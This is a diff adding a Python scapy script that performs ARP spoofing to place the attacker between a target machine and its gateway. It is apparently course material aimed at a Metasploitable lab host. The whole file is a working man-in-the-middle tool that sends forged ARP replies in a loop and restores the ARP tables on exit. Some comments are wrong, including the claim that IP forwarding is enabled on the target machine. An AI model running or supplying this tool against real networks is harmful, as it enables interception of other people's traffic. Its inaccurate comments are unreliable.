@@ -1,0 +1,67 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import time
+import sys
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
+    parser.add_argument("-g", "--gateway",default="192.168.100.2", dest="gateway", help="Gateway IP / Target 2 IP")
+    options = parser.parse_args()
+    return options
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    # In ARP packet the "op" field is 1 for request and 2 for response
+    # We set the pdst and hwdst using the network_scanner we and it is of the metasploitable machine
+    # psrc we set as the router IP because we want to tell the target that we are the router
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    ## Above we didn't specify the hwsrc i.e the src MAC, since scapy by default puts this machine's address as src MAC and thats what we wanted
+    # print(packet.show())
+    # print(packet.summary())
+    p = scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    #  here we have to provide the src MAC explicitly since otherwise we'll be spoofing the victim again
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)     # Send the packet 4 times to ensure its restored
+
+
+
+options = get_arguments()
+target_ip = options.target
+gateway_ip = options.gateway
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(target_ip, gateway_ip)
+        sent_packets_count += 2
+        print("\r[+] Packets sent: " + str(sent_packets_count)),
+        # , used above to make print statement print in straight line and \r to start from the beginning of print everytime, not the new line
+        # above print statement with , pushes everything to a buffer which is printed only after we exit the loop
+        # Thus, we use the below command to flush the buffer everytime
+        sys.stdout.flush()
+        # For Python3 we dont need to flush() and instead of print(), we write print("", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected Ctrl+C ... Resetting ARP tables... Please wait")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+# To enable packet forwarding, since the target is a computer not router,
+# echo 1 > /proc/sys/net/ipv4/ip_forward -- need to run this command in the target machine
